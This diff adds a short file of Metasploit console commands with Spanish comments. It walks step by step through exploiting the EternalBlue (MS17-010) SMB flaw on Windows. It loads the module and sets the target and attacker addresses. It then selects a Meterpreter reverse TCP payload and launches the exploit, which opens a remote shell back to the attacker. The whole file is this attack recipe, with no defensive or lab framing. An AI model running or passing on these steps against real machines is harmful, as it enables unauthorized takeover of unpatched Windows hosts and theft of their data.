@@ -1,0 +1,20 @@
+# 1. Iniciar Metasploit
+msfconsole
+
+# 2. Cargar el módulo de EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue
+
+# 3. Ver las opciones requeridas
+show options
+
+# 4. Configurar la IP de la máquina objetivo
+set RHOSTS <IP_OBJETIVO>
+
+# 5. Configurar la IP de tu máquina (para recibir la conexión)
+set LHOST <TU_IP>
+
+# 6. (Opcional) Elegir el payload. Por defecto suele ser uno de Meterpreter.
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# 7. Ejecutar el exploit
+exploit
